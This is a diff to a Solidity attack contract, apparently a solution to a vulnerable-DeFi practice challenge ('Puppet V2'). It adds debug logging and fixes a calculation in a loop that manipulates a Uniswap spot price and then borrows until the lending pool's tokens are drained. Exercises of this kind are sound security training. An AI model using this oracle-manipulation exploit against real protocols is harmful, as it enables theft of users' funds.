@@ -36,10 +36,11 @@ contract AttackV2Puppet{
 
         while (dvt.balanceOf(address(pool)) > 0)
         {
+            console.log("------------------------------------------------------");
             console.log("Starting Phase1:");
             console.log("DVTBalanceOfPool  = %s", dvt.balanceOf(address(pool)));
-            console.log("WETHBalanceOfPool = %s", dvt.balanceOf(address(this)));
-            console.log("DVTBalanceOfUs    = %s", weth.balanceOf(address(pool)));
+            console.log("WETHBalanceOfPool = %s", weth.balanceOf(address(pool)));
+            console.log("DVTBalanceOfUs    = %s", dvt.balanceOf(address(this)));
             console.log("WETHBalanceOfUs   = %s", weth.balanceOf(address(this)));
                         
             //PHASE 1: Swapping at the AMM
@@ -54,6 +55,13 @@ contract AttackV2Puppet{
             //swap our tokens for eth
             router.swapExactTokensForTokens(dvt.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);
 
+            console.log("------------------------------------------------------");
+            console.log("Starting Phase2:");
+            console.log("DVTBalanceOfPool  = %s", dvt.balanceOf(address(pool)));
+            console.log("WETHBalanceOfPool = %s", weth.balanceOf(address(pool)));
+            console.log("DVTBalanceOfUs    = %s", dvt.balanceOf(address(this)));
+            console.log("WETHBalanceOfUs   = %s", weth.balanceOf(address(this)));
+
             //PHASE 2: Lending out as much as we can
             //calculate how many tokens we can lend out
             uint256 max_lend = maxLend(weth.balanceOf(address(this)));
@@ -61,6 +69,7 @@ contract AttackV2Puppet{
             //We are still not able to get all
             if (max_lend < dvt.balanceOf(address(pool)))
             {
+                console.log("Normal Lending");
                 //Lend out as many tokens as possible
                 weth.approve(address(pool), weth.balanceOf(address(this)));
                 pool.borrow(max_lend);
@@ -68,6 +77,7 @@ contract AttackV2Puppet{
             else
             {
                 //we need to exactly calculate how to get the rest out
+                console.log("Final Lending");
 
                 //calculate how much weth we need to send to get the rest of the tokens out
                 uint256 final_value_sent = neededCollateral(dvt.balanceOf(address(pool)));
@@ -109,6 +119,6 @@ contract AttackV2Puppet{
         //retrieve the reserves of the pair from the factory
         (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(dvt));
 
-        return UniswapV2Library.quote(amount, reservesWETH, reservesToken) / (3 ether);
+        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesWETH, reservesToken) / (3 ether);
     }
 }
